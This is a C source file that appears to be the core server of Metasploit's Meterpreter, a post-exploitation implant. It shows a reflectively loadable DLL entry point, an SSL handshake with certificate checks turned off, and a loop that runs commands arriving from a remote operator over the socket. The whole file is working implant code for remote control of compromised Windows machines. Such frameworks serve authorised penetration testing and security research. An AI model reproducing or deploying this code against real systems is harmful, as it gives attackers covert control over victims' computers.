#include "metsrv.h"

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION 
#include <excpt.h> 

// include the PolarSSL library
#pragma comment(lib,"polarssl.lib")

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/ReflectiveLoader.c"

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

DWORD monitor_loop(Remote *remote);




int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep) {
	return EXCEPTION_EXECUTE_HANDLER;
}

/*
 * Entry point for the DLL (or not if compiled as an EXE)
 */
DWORD __declspec(dllexport) Init(SOCKET fd)
{
	Remote *remote = NULL;
	DWORD res = 0;

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	if( hAppInstance == NULL )
		hAppInstance = GetModuleHandle( NULL );

	srand(time(NULL));

	__try 
	{

	do
	{
		if (!(remote = remote_allocate(fd)))
		{
			SetLastError(ERROR_NOT_ENOUGH_MEMORY);
			break;
		}

		// Do not allow the file descriptor to be inherited by child 
		// processes
		SetHandleInformation(fd, HANDLE_FLAG_INHERIT, 0);

		// Initialize SSL on the socket
		dprintf("Negotiating SSL...");
		negotiate_ssl(remote);

		// Register extension dispatch routines
		dprintf("Registering dispatch routines...");		
		register_dispatch_routines();

		dprintf("Entering the monitor loop...");		
		// Keep processing commands
		res = monitor_loop(remote);
	
		dprintf("Deregistering dispatch routines...");		
		// Clean up our dispatch routines
		deregister_dispatch_routines();

	} while (0);

	dprintf("Closing down SSL...");		
	ssl_close_notify(&remote->ssl);
	ssl_free(&remote->ssl);

	if (remote)
		remote_deallocate(remote);
	}

	/* Invoke the fatal error handler */
	__except(exceptionfilter(GetExceptionCode(), GetExceptionInformation())) {
		dprintf("*** exception triggered!");
		ExitThread(0);
	}

	return res;
}

/*
 * Monitor for requests and local waitable items in the scheduler
 */
DWORD negotiate_ssl(Remote *remote)
{
	DWORD hres = ERROR_SUCCESS;
	SOCKET fd = remote_get_fd(remote);
	fd_set fdread;
    
	havege_state hs;
	ssl_context *ssl = &remote->ssl;
    ssl_session *ssn = &remote->ssn;

    havege_init( &hs );
    memset( ssn, 0, sizeof( ssl_session ) );

    if(ssl_init(ssl) != 0 ) return(1);

    ssl_set_endpoint( ssl, SSL_IS_CLIENT );
    ssl_set_authmode( ssl, SSL_VERIFY_NONE );
    ssl_set_rng( ssl, havege_rand, &hs );
    ssl_set_bio( ssl, net_recv, &fd, net_send, &fd );
    ssl_set_ciphers( ssl, ssl_default_ciphers );
    ssl_set_session( ssl, 1, 60000, ssn );


	dprintf("Sending a HTTP GET request to the remote side...");
	/* This wakes up the sock.ssl.accept() on the remote side */
	while(ssl_write(ssl, "GET / HTTP/1.0\r\n\r\n", 18) == POLARSSL_ERR_NET_TRY_AGAIN) {}
	dprintf("Completed writing the HTTP GET request");

	return(0);
}
/*
 * Monitor for requests and local waitable items in the scheduler
 */
DWORD monitor_loop(Remote *remote)
{
	DWORD hres = ERROR_SUCCESS;
	SOCKET fd = remote_get_fd(remote);
	fd_set fdread;
    
	/*
	 * Read data locally and remotely
	 */
	while (1)
	{
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		tv.tv_sec  = 0;
		tv.tv_usec = 100;

		data = select(fd + 1, &fdread, NULL, NULL, &tv);

		if (data > 0)
		{
			if ((hres = command_process_remote(remote, NULL)) != ERROR_SUCCESS)
				break;
		}
		else if (data < 0)
			break;

		// Process local scheduler items
		scheduler_run(remote, 0);
	}

	return hres;
}
